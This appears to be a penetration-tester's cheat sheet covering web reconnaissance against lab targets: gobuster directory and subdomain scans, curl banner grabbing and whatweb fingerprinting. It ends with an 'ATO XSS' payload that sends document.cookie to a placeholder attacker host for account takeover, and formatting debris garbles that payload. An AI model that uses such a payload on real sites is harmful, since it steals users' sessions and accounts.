#### Gobuster

Simple gobuster directory and file scan
```shell-session
 gobuster dir -u http://10.10.10.121/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Simple DNS Subdomain scan
**NOTE :** Add the ip and domain on `/etc/resolv.conf` first before scanning
```shell-session
 gobuster dns -d inlanefreight.com -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt
```

---
#### Banner Grabbing / Web Server Headers

web server banner grabbing with curl
```shell-session
curl -IL https://www.inlanefreight.com
```

---
#### Whatweb

```shell-session
whatweb <rhost>
```
OR
```shell-session
whatweb 10.10.10.121
```
OR
```shell-session
 whatweb --no-errors 10.10.10.0/24
```

---
#### Robots.txt

----
#### Source Code
```
CTRL + U
```
---

#### ATO XSS
```xss
<script>fetch(‘_**[**_http://YOUR-IP:8000/?c='+document.cookie_**](http://your-ip:8000/?c=%27+document.cookie)**_)</script>
```



